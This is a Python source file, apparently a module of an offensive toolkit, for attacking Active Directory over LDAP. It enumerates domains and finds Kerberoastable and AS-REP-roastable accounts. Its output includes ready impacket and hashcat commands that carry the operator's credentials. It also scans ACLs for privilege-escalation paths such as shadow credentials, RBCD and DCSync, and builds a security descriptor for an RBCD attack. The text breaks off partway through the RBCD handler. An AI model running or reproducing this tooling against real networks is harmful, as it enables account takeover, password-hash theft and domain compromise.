"""Active Directory attack module using ldap3 (pure Python LDAP)."""

import os
import struct
import socket
import logging
import time
import ssl
import hashlib
import datetime

try:
    import ldap3
    from ldap3 import Server, Connection, ALL, NTLM, SIMPLE, SUBTREE, MODIFY_REPLACE, MODIFY_ADD, MODIFY_DELETE
    from ldap3.core.exceptions import LDAPException
    from ldap3.protocol.microsoft import security_descriptor_control
    HAS_LDAP3 = True
except ImportError:
    HAS_LDAP3 = False

log = logging.getLogger("phantom.modules.ad")

NAME = "ad"

# Well-known SIDs
WELL_KNOWN_SIDS = {
    "S-1-5-32-544": "BUILTIN\\Administrators",
    "S-1-5-32-548": "BUILTIN\\Account Operators",
    "S-1-5-32-549": "BUILTIN\\Server Operators",
    "S-1-5-32-550": "BUILTIN\\Print Operators",
    "S-1-5-32-551": "BUILTIN\\Backup Operators",
}

# UAC flag bits
UAC_FLAGS = {
    0x0001: "SCRIPT",
    0x0002: "ACCOUNTDISABLE",
    0x0008: "HOMEDIR_REQUIRED",
    0x0010: "LOCKOUT",
    0x0020: "PASSWD_NOTREQD",
    0x0040: "PASSWD_CANT_CHANGE",
    0x0080: "ENCRYPTED_TEXT_PWD_ALLOWED",
    0x0100: "TEMP_DUPLICATE_ACCOUNT",
    0x0200: "NORMAL_ACCOUNT",
    0x0800: "INTERDOMAIN_TRUST_ACCOUNT",
    0x1000: "WORKSTATION_TRUST_ACCOUNT",
    0x2000: "SERVER_TRUST_ACCOUNT",
    0x10000: "DONT_EXPIRE_PASSWORD",
    0x20000: "MNS_LOGON_ACCOUNT",
    0x40000: "SMARTCARD_REQUIRED",
    0x80000: "TRUSTED_FOR_DELEGATION",
    0x100000: "NOT_DELEGATED",
    0x200000: "USE_DES_KEY_ONLY",
    0x400000: "DONT_REQ_PREAUTH",
    0x800000: "PASSWORD_EXPIRED",
    0x1000000: "TRUSTED_TO_AUTH_FOR_DELEGATION",
    0x4000000: "PARTIAL_SECRETS_ACCOUNT",
}

# ACE access mask bits relevant for AD abuse
ACE_RIGHTS = {
    0x00000001: "GenericRead",
    0x00000002: "GenericWrite",
    0x00000004: "GenericExecute",
    0x00000008: "GenericAll",  # maps after decoding
    0x00010000: "DELETE",
    0x00020000: "READ_CONTROL",
    0x00040000: "WRITE_DAC",
    0x00080000: "WRITE_OWNER",
    0x000F01FF: "FULL_CONTROL",
}

# Extended rights GUIDs for AD abuse
EXTENDED_RIGHTS = {
    "00299570-246d-11d0-a768-00aa006e0529": "User-Force-Change-Password",
    "ab721a53-1e2f-11d0-9819-00aa0040529b": "User-Change-Password",
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes",
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2": "DS-Replication-Get-Changes-All",
    "89e95b76-444d-4c62-991a-0facbeda640c": "DS-Replication-Get-Changes-In-Filtered-Set",
}

# Property set / attribute GUIDs for targeted write attacks
WRITE_PROPERTY_GUIDS = {
    "f3a64788-5306-11d1-a9c5-0000f80367c1": "servicePrincipalName",
    "5b47d60f-6090-40b2-9f37-2a4de88f3063": "msDS-KeyCredentialLink",
    "3f78c3e5-f79a-46bd-a0b8-9d18116ddc79": "msDS-AllowedToActOnBehalfOfOtherIdentity",
    "bf9679c0-0de6-11d0-a285-00aa003049e2": "member",
    "4c164200-20c0-11d0-a768-00aa006e0529": "User-Account-Restrictions",
}

# EKU OIDs relevant for ADCS
EKU_OIDS = {
    "1.3.6.1.5.5.7.3.2": "Client Authentication",
    "1.3.6.1.5.2.3.4": "PKINIT Client Authentication",
    "1.3.6.1.4.1.311.20.2.2": "Smart Card Logon",
    "2.5.29.37.0": "Any Purpose",
    "1.3.6.1.5.5.7.3.1": "Server Authentication",
    "1.3.6.1.4.1.311.21.6": "Key Recovery Agent",
    "1.3.6.1.4.1.311.20.2.1": "Certificate Request Agent",
}

# Trust direction mapping
TRUST_DIRECTION = {0: "Disabled", 1: "Inbound", 2: "Outbound", 3: "Bidirectional"}
TRUST_TYPE = {1: "Downlevel (Windows NT)", 2: "Uplevel (Windows 2000+)", 3: "MIT Kerberos", 4: "DCE"}
TRUST_ATTRIBUTES = {
    0x00000001: "NON_TRANSITIVE",
    0x00000002: "UPLEVEL_ONLY",
    0x00000004: "QUARANTINED_DOMAIN (SID Filtering)",
    0x00000008: "FOREST_TRANSITIVE",
    0x00000010: "CROSS_ORGANIZATION",
    0x00000020: "WITHIN_FOREST",
    0x00000040: "TREAT_AS_EXTERNAL",
    0x00000080: "USES_RC4_ENCRYPTION",
    0x00000200: "CROSS_ORGANIZATION_NO_TGT_DELEGATION",
    0x00000400: "PIM_TRUST",
}


def _require_ldap3():
    if not HAS_LDAP3:
        return {"status": "error", "error": "ldap3 is not installed. Run: pip install ldap3"}
    return None


def _domain_to_dn(domain: str) -> str:
    return ",".join(f"DC={part}" for part in domain.split("."))


def _filetime_to_str(ft) -> str:
    """Convert Windows FILETIME (100ns since 1601-01-01) to readable string."""
    if not ft or ft == 0 or ft == 9223372036854775807:
        return "Never"
    try:
        ts = (int(ft) - 116444736000000000) / 10000000
        if ts < 0:
            return "Never"
        return datetime.datetime.utcfromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S UTC")
    except (ValueError, OSError, OverflowError):
        return "Never"


def _decode_uac(uac_value) -> list:
    """Decode userAccountControl flags into human-readable list."""
    try:
        uac = int(uac_value)
    except (ValueError, TypeError):
        return []
    flags = []
    for bit, name in UAC_FLAGS.items():
        if uac & bit:
            flags.append(name)
    return flags


def _resolve_dc(domain: str) -> str:
    """Try to discover DC via DNS SRV records, fall back to domain name itself."""
    try:
        import subprocess
        result = subprocess.check_output(
            ["nslookup", "-type=SRV", f"_ldap._tcp.dc._msdcs.{domain}"],
            stderr=subprocess.DEVNULL, timeout=5
        ).decode(errors="replace")
        for line in result.splitlines():
            if "svr hostname" in line.lower() or "target" in line.lower():
                parts = line.split("=")
                if len(parts) > 1:
                    host = parts[-1].strip().rstrip(".")
                    if host:
                        return host
    except Exception:
        pass
    # Fallback: try _ldap._tcp SRV via socket
    try:
        answers = socket.getaddrinfo(f"_ldap._tcp.{domain}", None)
        if answers:
            return answers[0][4][0]
    except Exception:
        pass
    # Last resort: resolve the domain name itself
    try:
        socket.gethostbyname(domain)
        return domain
    except Exception:
        pass
    return domain


def _ldap_connect(dc: str, domain: str, username: str, password: str, use_ssl: bool = False):
    """Establish LDAP connection to DC. Returns (connection, base_dn) or raises."""
    err = _require_ldap3()
    if err:
        raise RuntimeError(err["error"])

    port = 636 if use_ssl else 389
    tls = ldap3.Tls(validate=ssl.CERT_NONE) if use_ssl else None
    server = Server(dc, port=port, use_ssl=use_ssl, tls=tls, get_info=ALL, connect_timeout=10)
    base_dn = _domain_to_dn(domain)

    # Try NTLM bind first
    ntlm_user = f"{domain}\\{username}"
    try:
        conn = Connection(server, user=ntlm_user, password=password,
                          authentication=NTLM, auto_bind=True, receive_timeout=30)
        return conn, base_dn
    except LDAPException:
        pass

    # Fall back to simple bind
    bind_dn = f"{username}@{domain}"
    conn = Connection(server, user=bind_dn, password=password,
                      authentication=SIMPLE, auto_bind=True, receive_timeout=30)
    return conn, base_dn


def _search(conn, base_dn: str, search_filter: str, attributes: list, scope=SUBTREE,
            controls=None, page_size: int = 1000) -> list:
    """LDAP search with paging support for large domains."""
    results = []
    cookie = True
    paged_cookie = None

    while cookie:
        conn.search(
            search_base=base_dn,
            search_filter=search_filter,
            search_scope=scope,
            attributes=attributes,
            paged_size=page_size,
            paged_cookie=paged_cookie,
            controls=controls,
        )
        results.extend(conn.entries)
        # Check for paged results cookie
        try:
            cookie_ctrl = conn.result.get("controls", {}).get("1.2.840.113556.1.4.319", {})
            paged_cookie = cookie_ctrl.get("value", {}).get("cookie")
            if not paged_cookie:
                cookie = False
        except (AttributeError, KeyError):
            cookie = False

    return results


def _get_entry_attr(entry, attr: str, default=None):
    """Safely extract an attribute value from an ldap3 entry."""
    try:
        val = getattr(entry, attr, None)
        if val is None:
            return default
        v = val.value
        if v is None or v == [] or v == "":
            return default
        return v
    except Exception:
        return default


def _get_entry_attr_list(entry, attr: str) -> list:
    """Safely extract a multi-valued attribute as list."""
    try:
        val = getattr(entry, attr, None)
        if val is None:
            return []
        v = val.values if hasattr(val, "values") else val.value
        if isinstance(v, list):
            return v
        if v is None:
            return []
        return [v]
    except Exception:
        return []


def _sid_to_str(binary_sid) -> str:
    """Convert a binary SID to its string representation S-1-..."""
    if isinstance(binary_sid, str):
        return binary_sid
    if not binary_sid or len(binary_sid) < 8:
        return ""
    try:
        revision = binary_sid[0]
        sub_authority_count = binary_sid[1]
        authority = int.from_bytes(binary_sid[2:8], byteorder="big")
        sids = [f"S-{revision}-{authority}"]
        for i in range(sub_authority_count):
            offset = 8 + i * 4
            sub = struct.unpack("<I", binary_sid[offset:offset + 4])[0]
            sids.append(str(sub))
        return "-".join(sids)
    except Exception:
        return ""


def _build_security_descriptor(sid_string: str) -> bytes:
    """Build a minimal security descriptor with msDS-AllowedToActOnBehalfOfOtherIdentity
    containing the given SID. This constructs the nTSecurityDescriptor binary blob
    with a DACL granting FULL_CONTROL to the specified SID."""
    parts = sid_string.split("-")
    revision = int(parts[1])
    authority = int(parts[2])
    sub_authorities = [int(x) for x in parts[3:]]

    sid_bytes = struct.pack("BB", revision, len(sub_authorities))
    sid_bytes += struct.pack(">Q", authority)[2:]  # 6 bytes big-endian
    for sa in sub_authorities:
        sid_bytes += struct.pack("<I", sa)

    # ACE: ACCESS_ALLOWED_ACE (type=0, flags=0, mask=FULL_CONTROL 0x000F01FF)
    ace_header = struct.pack("<BBH", 0x00, 0x00, 8 + len(sid_bytes))
    ace_mask = struct.pack("<I", 0x000F01FF)
    ace = ace_header + ace_mask + sid_bytes

    # DACL header: revision=2, size, ace_count=1
    dacl = struct.pack("<BBHHH", 0x02, 0x00, 8 + len(ace), 1, 0) + ace

    # Security descriptor: revision=1, control=0x0004 (DACL present), self-relative
    sd_size = 20 + len(dacl)  # SD header is 20 bytes
    sd = struct.pack("<BBHIIIII",
                     0x01,  # revision
                     0x00,  # sbz
                     0x8004,  # control: SE_DACL_PRESENT | SE_SELF_RELATIVE
                     0,  # owner offset (none)
                     0,  # group offset (none)
                     0,  # SACL offset (none)
                     20)  # DACL offset
    sd += dacl
    return sd


# ---------------------------------------------------------------------------
# Command handlers
# ---------------------------------------------------------------------------

def cmd_ad_enum(dc: str, domain: str, username: str, password: str) -> dict:
    """Full domain enumeration: users, computers, groups, OUs, GPOs, trusts."""
    err = _require_ldap3()
    if err:
        return err

    if not dc:
        dc = _resolve_dc(domain)

    conn, base_dn = _ldap_connect(dc, domain, username, password)
    results = {}

    # Domain info
    try:
        info = conn.server.info
        results["domain"] = {
            "name": domain,
            "base_dn": base_dn,
            "dc": dc,
            "dns_hostname": str(getattr(info, "other", {}).get("dnsHostName", [""])[0]) if info else "",
            "forest_functionality": str(getattr(info, "other", {}).get("forestFunctionality", [""])[0]) if info else "",
            "domain_functionality": str(getattr(info, "other", {}).get("domainFunctionality", [""])[0]) if info else "",
            "dc_functionality": str(getattr(info, "other", {}).get("domainControllerFunctionality", [""])[0]) if info else "",
        }
    except Exception as e:
        results["domain"] = {"name": domain, "error": str(e)}

    # Domain Controllers
    dcs = _search(conn, base_dn,
                  "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))",
                  ["cn", "dNSHostName", "operatingSystem", "operatingSystemVersion"])
    results["domain_controllers"] = [{
        "name": str(_get_entry_attr(e, "cn", "")),
        "hostname": str(_get_entry_attr(e, "dNSHostName", "")),
        "os": str(_get_entry_attr(e, "operatingSystem", "")),
        "os_version": str(_get_entry_attr(e, "operatingSystemVersion", "")),
    } for e in dcs]

    # Users with relevant security attributes
    users = _search(conn, base_dn,
                    "(&(objectCategory=person)(objectClass=user))",
                    ["sAMAccountName", "distinguishedName", "adminCount", "lastLogon",
                     "pwdLastSet", "userAccountControl", "servicePrincipalName",
                     "memberOf", "description", "mail"])
    user_list = []
    for u in users:
        uac = _get_entry_attr(u, "userAccountControl", 0)
        uac_flags = _decode_uac(uac)
        spns = _get_entry_attr_list(u, "servicePrincipalName")
        user_list.append({
            "username": str(_get_entry_attr(u, "sAMAccountName", "")),
            "dn": str(_get_entry_attr(u, "distinguishedName", "")),
            "admin_count": bool(_get_entry_attr(u, "adminCount", 0)),
            "last_logon": _filetime_to_str(_get_entry_attr(u, "lastLogon", 0)),
            "pwd_last_set": _filetime_to_str(_get_entry_attr(u, "pwdLastSet", 0)),
            "uac_flags": uac_flags,
            "disabled": "ACCOUNTDISABLE" in uac_flags,
            "spns": [str(s) for s in spns] if spns else [],
            "description": str(_get_entry_attr(u, "description", "")),
            "email": str(_get_entry_attr(u, "mail", "")),
        })
    results["users"] = {"count": len(user_list), "entries": user_list}

    # Computers with delegation settings
    computers = _search(conn, base_dn,
                        "(objectCategory=computer)",
                        ["cn", "dNSHostName", "operatingSystem", "operatingSystemVersion",
                         "userAccountControl", "msDS-AllowedToDelegateTo",
                         "msDS-AllowedToActOnBehalfOfOtherIdentity",
                         "ms-Mcs-AdmPwd", "ms-Mcs-AdmPwdExpirationTime"])
    comp_list = []
    for c in computers:
        uac = _get_entry_attr(c, "userAccountControl", 0)
        uac_flags = _decode_uac(uac)
        delegation_type = "None"
        if "TRUSTED_FOR_DELEGATION" in uac_flags:
            delegation_type = "Unconstrained"
        elif _get_entry_attr_list(c, "msDS-AllowedToDelegateTo"):
            delegation_type = "Constrained"
        if _get_entry_attr(c, "msDS-AllowedToActOnBehalfOfOtherIdentity"):
            delegation_type = delegation_type + "+RBCD" if delegation_type != "None" else "RBCD"

        comp_list.append({
            "name": str(_get_entry_attr(c, "cn", "")),
            "hostname": str(_get_entry_attr(c, "dNSHostName", "")),
            "os": str(_get_entry_attr(c, "operatingSystem", "")),
            "os_version": str(_get_entry_attr(c, "operatingSystemVersion", "")),
            "delegation": delegation_type,
            "constrained_targets": [str(t) for t in _get_entry_attr_list(c, "msDS-AllowedToDelegateTo")],
            "has_laps": bool(_get_entry_attr(c, "ms-Mcs-AdmPwd")),
        })
    results["computers"] = {"count": len(comp_list), "entries": comp_list}

    # High-privilege groups and members
    high_priv_groups = [
        "(cn=Domain Admins)", "(cn=Enterprise Admins)", "(cn=Administrators)",
        "(cn=Schema Admins)", "(cn=Account Operators)", "(cn=Server Operators)",
        "(cn=Backup Operators)", "(cn=DnsAdmins)", "(cn=Group Policy Creator Owners)",
    ]
    group_filter = f"(&(objectCategory=group)(|{''.join(high_priv_groups)}))"
    groups = _search(conn, base_dn, group_filter,
                     ["cn", "distinguishedName", "member", "description"])
    group_list = []
    for g in groups:
        members = _get_entry_attr_list(g, "member")
        group_list.append({
            "name": str(_get_entry_attr(g, "cn", "")),
            "dn": str(_get_entry_attr(g, "distinguishedName", "")),
            "members": [str(m) for m in members],
            "member_count": len(members),
            "description": str(_get_entry_attr(g, "description", "")),
        })
    results["high_priv_groups"] = group_list

    # OUs
    ous = _search(conn, base_dn, "(objectCategory=organizationalUnit)",
                  ["ou", "distinguishedName", "description"])
    results["ous"] = [{
        "name": str(_get_entry_attr(o, "ou", "")),
        "dn": str(_get_entry_attr(o, "distinguishedName", "")),
        "description": str(_get_entry_attr(o, "description", "")),
    } for o in ous]

    # GPOs
    gpos = _search(conn, base_dn,
                   "(objectCategory=groupPolicyContainer)",
                   ["displayName", "gPCFileSysPath", "distinguishedName"])
    results["gpos"] = [{
        "name": str(_get_entry_attr(g, "displayName", "")),
        "path": str(_get_entry_attr(g, "gPCFileSysPath", "")),
        "dn": str(_get_entry_attr(g, "distinguishedName", "")),
    } for g in gpos]

    # Trusts
    trusts = _search(conn, base_dn,
                     "(objectClass=trustedDomain)",
                     ["cn", "trustDirection", "trustType", "trustAttributes",
                      "trustPartner", "flatName"])
    trust_list = []
    for t in trusts:
        direction = int(_get_entry_attr(t, "trustDirection", 0))
        ttype = int(_get_entry_attr(t, "trustType", 0))
        tattrs = int(_get_entry_attr(t, "trustAttributes", 0))
        attr_flags = [name for bit, name in TRUST_ATTRIBUTES.items() if tattrs & bit]
        trust_list.append({
            "name": str(_get_entry_attr(t, "cn", "")),
            "partner": str(_get_entry_attr(t, "trustPartner", "")),
            "direction": TRUST_DIRECTION.get(direction, str(direction)),
            "type": TRUST_TYPE.get(ttype, str(ttype)),
            "attributes": attr_flags,
            "sid_filtering": bool(tattrs & 0x00000004),
        })
    results["trusts"] = trust_list

    conn.unbind()
    return results


def cmd_ad_kerberoast(dc: str, domain: str, username: str, password: str,
                      target_user: str = "") -> dict:
    """Find Kerberoastable accounts (users with SPNs set)."""
    err = _require_ldap3()
    if err:
        return err

    if not dc:
        dc = _resolve_dc(domain)

    conn, base_dn = _ldap_connect(dc, domain, username, password)

    # Filter: user accounts with SPN, skip krbtgt and disabled accounts
    if target_user:
        spn_filter = (f"(&(objectCategory=person)(objectClass=user)"
                      f"(servicePrincipalName=*)(sAMAccountName={target_user})"
                      f"(!(sAMAccountName=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))")
    else:
        spn_filter = ("(&(objectCategory=person)(objectClass=user)"
                      "(servicePrincipalName=*)"
                      "(!(sAMAccountName=krbtgt))"
                      "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"  # not disabled
                      "(!(objectCategory=computer)))")  # skip machine accounts

    entries = _search(conn, base_dn, spn_filter,
                      ["sAMAccountName", "servicePrincipalName", "memberOf",
                       "adminCount", "pwdLastSet", "lastLogon", "description"])

    targets = []
    for e in entries:
        spns = _get_entry_attr_list(e, "servicePrincipalName")
        member_of = _get_entry_attr_list(e, "memberOf")
        is_admin = any("Domain Admins" in str(g) or "Enterprise Admins" in str(g) for g in member_of)
        targets.append({
            "username": str(_get_entry_attr(e, "sAMAccountName", "")),
            "spns": [str(s) for s in spns],
            "admin_count": bool(_get_entry_attr(e, "adminCount", 0)),
            "is_domain_admin": is_admin,
            "pwd_last_set": _filetime_to_str(_get_entry_attr(e, "pwdLastSet", 0)),
            "last_logon": _filetime_to_str(_get_entry_attr(e, "lastLogon", 0)),
            "description": str(_get_entry_attr(e, "description", "")),
            "member_of": [str(g) for g in member_of],
        })

    conn.unbind()

    # Sort high-value targets first (admins, old passwords)
    targets.sort(key=lambda x: (not x["is_domain_admin"], not x["admin_count"]))

    return {
        "kerberoastable_count": len(targets),
        "targets": targets,
        "exploit_cmd": (
            f"# Request TGS tickets with impacket:\n"
            f"GetUserSPNs.py '{domain}/{username}:{password}' -dc-ip {dc} -request -outputfile hashes.kerberoast\n"
            f"# Crack with hashcat:\n"
            f"hashcat -m 13100 hashes.kerberoast /path/to/wordlist.txt\n"
            f"# Or with john:\n"
            f"john --format=krb5tgs --wordlist=/path/to/wordlist.txt hashes.kerberoast"
        ),
        "hashcat_format": "$krb5tgs$23$*user$domain$SPN*$<hash>",
    }


def cmd_ad_asreproast(dc: str, domain: str, username: str, password: str) -> dict:
    """Find AS-REP Roastable accounts (DONT_REQUIRE_PREAUTH flag)."""
    err = _require_ldap3()
    if err:
        return err

    if not dc:
        dc = _resolve_dc(domain)

    conn, base_dn = _ldap_connect(dc, domain, username, password)

    # UAC bit 0x400000 = DONT_REQUIRE_PREAUTH
    asrep_filter = ("(&(objectCategory=person)(objectClass=user)"
                    "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
                    "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))")

    entries = _search(conn, base_dn, asrep_filter,
                      ["sAMAccountName", "distinguishedName", "memberOf",
                       "adminCount", "pwdLastSet", "description"])

    targets = []
    for e in entries:
        member_of = _get_entry_attr_list(e, "memberOf")
        targets.append({
            "username": str(_get_entry_attr(e, "sAMAccountName", "")),
            "dn": str(_get_entry_attr(e, "distinguishedName", "")),
            "admin_count": bool(_get_entry_attr(e, "adminCount", 0)),
            "pwd_last_set": _filetime_to_str(_get_entry_attr(e, "pwdLastSet", 0)),
            "description": str(_get_entry_attr(e, "description", "")),
            "member_of": [str(g) for g in member_of],
        })

    conn.unbind()

    return {
        "asreproastable_count": len(targets),
        "targets": targets,
        "exploit_cmd": (
            f"# Request AS-REP hashes with impacket:\n"
            f"GetNPUsers.py '{domain}/{username}:{password}' -dc-ip {dc} -request "
            f"-format hashcat -outputfile hashes.asreproast\n"
            f"# Or without creds (if you have a username list):\n"
            f"GetNPUsers.py '{domain}/' -dc-ip {dc} -usersfile users.txt "
            f"-format hashcat -outputfile hashes.asreproast\n"
            f"# Crack with hashcat:\n"
            f"hashcat -m 18200 hashes.asreproast /path/to/wordlist.txt"
        ),
        "hashcat_format": "$krb5asrep$23$user@domain:<hash>",
    }


def cmd_ad_acl_scan(dc: str, domain: str, username: str, password: str,
                    target: str = "") -> dict:
    """Scan ACLs for dangerous permissions (GenericAll, WriteDACL, etc.)."""
    err = _require_ldap3()
    if err:
        return err

    if not dc:
        dc = _resolve_dc(domain)

    conn, base_dn = _ldap_connect(dc, domain, username, password)

    # Determine objects to scan
    if target:
        search_filter = f"(sAMAccountName={target})"
    else:
        # Scan users, groups, computers, OUs that are high-value
        search_filter = ("(|"
                         "(&(objectCategory=person)(objectClass=user)(adminCount=1))"
                         "(&(objectCategory=group)(adminCount=1))"
                         "(objectCategory=organizationalUnit)"
                         "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
                         ")")

    # Request nTSecurityDescriptor with DACL
    sd_control = security_descriptor_control(sdflags=0x04)  # DACL only
    entries = _search(conn, base_dn, search_filter,
                      ["sAMAccountName", "distinguishedName", "objectClass",
                       "nTSecurityDescriptor", "objectSid"],
                      controls=[sd_control])

    # Resolve current user's SID for context
    current_user_entries = _search(conn, base_dn,
                                   f"(sAMAccountName={username})",
                                   ["objectSid", "memberOf"])
    current_user_groups = []
    current_user_sid = ""
    if current_user_entries:
        raw_sid = _get_entry_attr(current_user_entries[0], "objectSid")
        if raw_sid:
            current_user_sid = _sid_to_str(raw_sid) if isinstance(raw_sid, bytes) else str(raw_sid)
        current_user_groups = [str(g) for g in _get_entry_attr_list(current_user_entries[0], "memberOf")]

    # Dangerous rights to flag
    dangerous_masks = {
        0x10000000: "GenericAll",
        0x40000000: "GenericWrite",
        0x00040000: "WriteDACL",
        0x00080000: "WriteOwner",
    }

    attack_paths = []
    for entry in entries:
        obj_name = str(_get_entry_attr(entry, "sAMAccountName",
                                       _get_entry_attr(entry, "distinguishedName", "unknown")))
        obj_classes = _get_entry_attr_list(entry, "objectClass")
        sd_raw = _get_entry_attr(entry, "nTSecurityDescriptor")
        if not sd_raw or not isinstance(sd_raw, bytes):
            continue

        # Parse the binary security descriptor DACL
        try:
            aces = _parse_sd_dacl(sd_raw)
        except Exception:
            continue

        for ace in aces:
            ace_sid = ace.get("sid", "")
            ace_mask = ace.get("mask", 0)
            ace_type = ace.get("type", 0)
            object_type = ace.get("object_type", "")

            if ace_type != 0x00 and ace_type != 0x05:
                # Only ACCESS_ALLOWED and ACCESS_ALLOWED_OBJECT
                continue

            for mask_bit, right_name in dangerous_masks.items():
                if ace_mask & mask_bit:
                    attack_paths.append({
                        "source_sid": ace_sid,
                        "target": obj_name,
                        "right": right_name,
                        "ace_type": "ACCESS_ALLOWED_OBJECT" if ace_type == 0x05 else "ACCESS_ALLOWED",
                        "object_type_guid": object_type,
                        "attack": _suggest_acl_attack(right_name, obj_classes, object_type),
                    })

            # Check for specific dangerous extended rights (object ACEs)
            if ace_type == 0x05 and object_type:
                obj_type_lower = object_type.lower()
                if obj_type_lower in EXTENDED_RIGHTS:
                    right_name = EXTENDED_RIGHTS[obj_type_lower]
                    attack_paths.append({
                        "source_sid": ace_sid,
                        "target": obj_name,
                        "right": right_name,
                        "ace_type": "ACCESS_ALLOWED_OBJECT",
                        "object_type_guid": object_type,
                        "attack": _suggest_acl_attack(right_name, obj_classes, object_type),
                    })

                # Check for write-property on dangerous attributes
                if obj_type_lower in WRITE_PROPERTY_GUIDS and (ace_mask & 0x00000020):
                    prop_name = WRITE_PROPERTY_GUIDS[obj_type_lower]
                    attack_paths.append({
                        "source_sid": ace_sid,
                        "target": obj_name,
                        "right": f"WriteProperty:{prop_name}",
                        "ace_type": "ACCESS_ALLOWED_OBJECT",
                        "object_type_guid": object_type,
                        "attack": _suggest_acl_attack(f"WriteProperty:{prop_name}", obj_classes, object_type),
                    })

    conn.unbind()

    return {
        "scanned_objects": len(entries),
        "attack_paths": attack_paths,
        "attack_path_count": len(attack_paths),
        "current_user_sid": current_user_sid,
    }


def _parse_sd_dacl(sd_raw: bytes) -> list:
    """Parse a binary nTSecurityDescriptor to extract DACL ACEs.
    Returns list of dicts with sid, mask, type, object_type fields."""
    aces = []
    if len(sd_raw) < 20:
        return aces

    # SD header: revision(1), sbz(1), control(2), owner_offset(4), group_offset(4),
    # sacl_offset(4), dacl_offset(4) = 20 bytes
    dacl_offset = struct.unpack("<I", sd_raw[16:20])[0]
    if dacl_offset == 0 or dacl_offset >= len(sd_raw):
        return aces

    # DACL header: revision(1), sbz(1), size(2), ace_count(2), sbz2(2) = 8 bytes
    dacl = sd_raw[dacl_offset:]
    if len(dacl) < 8:
        return aces

    ace_count = struct.unpack("<H", dacl[4:6])[0]
    offset = 8  # start of first ACE

    for _ in range(ace_count):
        if offset + 4 > len(dacl):
            break

        ace_type = dacl[offset]
        ace_flags = dacl[offset + 1]
        ace_size = struct.unpack("<H", dacl[offset + 2:offset + 4])[0]

        if ace_size < 4 or offset + ace_size > len(dacl):
            break

        ace_data = dacl[offset:offset + ace_size]

        if ace_type == 0x00:
            # ACCESS_ALLOWED_ACE: mask(4) + SID
            if len(ace_data) >= 8:
                mask = struct.unpack("<I", ace_data[4:8])[0]
                sid = _sid_to_str(ace_data[8:])
                aces.append({"type": ace_type, "mask": mask, "sid": sid, "object_type": ""})

        elif ace_type == 0x05:
            # ACCESS_ALLOWED_OBJECT_ACE: mask(4) + flags(4) + optional ObjectType(16) + optional InheritedObjectType(16) + SID
            if len(ace_data) >= 12:
                mask = struct.unpack("<I", ace_data[4:8])[0]
                obj_flags = struct.unpack("<I", ace_data[8:12])[0]
                sid_offset = 12
                object_type = ""

                if obj_flags & 0x01:  # ACE_OBJECT_TYPE_PRESENT
                    if sid_offset + 16 <= len(ace_data):
                        # Convert raw bytes to GUID string
                        guid_bytes = ace_data[sid_offset:sid_offset + 16]
                        object_type = _bytes_to_guid(guid_bytes)
                        sid_offset += 16

                if obj_flags & 0x02:  # ACE_INHERITED_OBJECT_TYPE_PRESENT
                    sid_offset += 16

                sid = _sid_to_str(ace_data[sid_offset:]) if sid_offset < len(ace_data) else ""
                aces.append({"type": ace_type, "mask": mask, "sid": sid, "object_type": object_type})

        offset += ace_size

    return aces


def _bytes_to_guid(b: bytes) -> str:
    """Convert 16 raw bytes to GUID string format."""
    if len(b) < 16:
        return ""
    p1 = struct.unpack("<IHH", b[0:8])
    p2 = b[8:16]
    return f"{p1[0]:08x}-{p1[1]:04x}-{p1[2]:04x}-{p2[0]:02x}{p2[1]:02x}-{p2[2]:02x}{p2[3]:02x}{p2[4]:02x}{p2[5]:02x}{p2[6]:02x}{p2[7]:02x}"


def _suggest_acl_attack(right: str, obj_classes: list, obj_type_guid: str) -> str:
    """Suggest exploitation path based on the ACL right and target type."""
    is_user = "user" in [str(c).lower() for c in obj_classes]
    is_computer = "computer" in [str(c).lower() for c in obj_classes]
    is_group = "group" in [str(c).lower() for c in obj_classes]

    if right == "GenericAll":
        if is_user:
            return "Reset password, set SPN (targeted kerberoast), shadow credentials, or set DONT_REQ_PREAUTH"
        if is_group:
            return "Add yourself or controlled user to the group"
        if is_computer:
            return "Configure RBCD, read LAPS password, or set shadow credentials"
        return "Full control over object -- modify any attribute"
    if right == "GenericWrite":
        if is_user:
            return "Set SPN for targeted kerberoasting, or write msDS-KeyCredentialLink for shadow credentials"
        if is_computer:
            return "Write msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD attack"
        return "Modify writable attributes on target"
    if right == "WriteDACL":
        return "Grant yourself GenericAll then exploit further"
    if right == "WriteOwner":
        return "Take ownership, then modify DACL to grant GenericAll"
    if right == "User-Force-Change-Password":
        return "Force reset user password without knowing current password"
    if "WriteProperty:servicePrincipalName" in right:
        return "Targeted kerberoasting: set an SPN, request TGS, crack offline"
    if "WriteProperty:msDS-KeyCredentialLink" in right:
        return "Shadow credentials attack: write key credential, authenticate as target"
    if "WriteProperty:msDS-AllowedToActOnBehalfOfOtherIdentity" in right:
        return "RBCD attack: configure delegation to impersonate any user to target"
    if "WriteProperty:member" in right:
        return "Add members to group"
    if "DS-Replication-Get-Changes" in right:
        return "DCSync attack: replicate password hashes from DC"
    return "Potentially exploitable permission"


def cmd_ad_rbcd(dc: str, domain: str, username: str, password: str,
                action: str = "scan", target_computer: str = "",
                controlled_sid: str = "") -> dict:
    """Resource-Based Constrained Delegation: scan, attack, or cleanup."""
    err = _require_ldap3()
    if err:
        return err

    if not dc:
        dc = _resolve_dc(domain)

    conn, base_dn = _ldap_connect(dc, domain, username, password)

    if action == "scan":
        # Find computers where msDS-AllowedToActOnBehalfOfOtherIdentity is set
        computers = _search(conn, base_dn,
                            "(objectCategory=computer)",
                            ["cn", "dNSHostName", "msDS-AllowedToActOnBehalfOfOtherIdentity",
                             "sAMAccountName"])
        rbcd_configured = []
        for c in computers:
            rbcd_val = _get_entry_attr(c, "msDS-AllowedToActOnBehalfOfOtherIdentity")
            if rbcd_val:
                rbcd_configured.append({
                    "computer": str(_get_entry_attr(c, "cn", "")),
                    "hostname": str(_get_entry_attr(c, "dNSHostName", "")),
                    "sam_account": str(_get_entry_attr(c, "sAMAccountName", "")),
                    "rbcd_configured": True,
                })

        conn.unbind()
        return {
            "action": "scan",
